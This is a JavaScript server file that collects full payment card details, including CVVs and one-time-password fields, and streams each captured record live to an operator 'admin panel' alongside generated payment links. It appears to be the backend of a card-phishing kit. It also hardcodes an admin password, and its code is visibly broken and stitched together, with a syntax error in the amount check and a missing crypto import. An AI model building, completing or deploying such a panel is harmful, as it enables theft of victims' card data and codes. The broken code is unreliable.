import express from 'express';
import http from 'http';
import { Server as SocketIOServer } from 'socket.io';
import bodyParser from 'body-parser';

const app = express();
const server = http.createServer(app);
const io = new SocketIOServer(server);

app.use(bodyParser.json());

const transactions = new Map(); // Store transactions in memory

// Emit new transaction to all connected clients when a new transaction is created
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount,
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    timestamp: new Date().toLocaleString(),
  };

  transactions.set(invoiceId, transaction);

  // Emit transaction data to admin panel clients
  io.emit('new-transaction', transaction);

  res.json({ status: "success", invoiceId });
});

// Serve the admin page and handle connections
app.get('/', (req, res) => {
  res.sendFile('path_to_admin_panel_html');  // Replace with your actual path to the HTML
});

io.on('connection', (socket) => {
  console.log('Admin connected:', socket.id);
  socket.emit('current-transactions', Array.from(transactions.values())); // Send current transactions to the admin panel
});

server.listen(3000, () => {
  console.log('Server running on port 3000');
});

// Add these at the top
import { Low } from 'lowdb';
import { JSONFile } from 'lowdb/node';

// Initialize database
const adapter = new JSONFile('db.json');
const db = new Low(adapter);
await db.read();
db.data ||= { transactions: [], paymentLinks: [] };

// Admin credentials (store securely in environment variables)
process.env.ADMIN_USER = 'admin';
process.env.ADMIN_PASS = 'Alex20HB@';

// Updated generatePaymentLink endpoint
app.post('/api/generatePaymentLink', async (req, res) => {
  try {
    const { amount, description } = req.body;
    
    // Validate input
    if (!amount || isNaN(amount) throw new Error('Invalid amount');
    if (!description?.trim()) throw new Error('Description required');

    // Generate secure ID
    const invoiceId = crypto.randomBytes(12).toString('hex');
    
    // Construct URL
    const paymentLink = `${req.protocol}://${req.get('host')}/payment.html?pid=${invoiceId}`;

    // Store in database
    db.data.paymentLinks.push({
      invoiceId,
      amount: parseFloat(amount),
      description,
      paymentLink,
      createdAt: new Date().toISOString()
    });
    await db.write();

    res.json({ status: "success", paymentLink });
    
  } catch (err) {
    console.error('Generate Link Error:', err);
    res.status(400).json({ 
      status: "error",
      message: err.message || 'Failed to generate link'
    });
  }
});


// Add admin login endpoint
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === process.env.ADMIN_USER && 
      password === process.env.ADMIN_PASS) {
    res.json({ status: "success" });
  } else {
    res.status(401).json({ status: "error", message: "Invalid credentials" });
  }
});

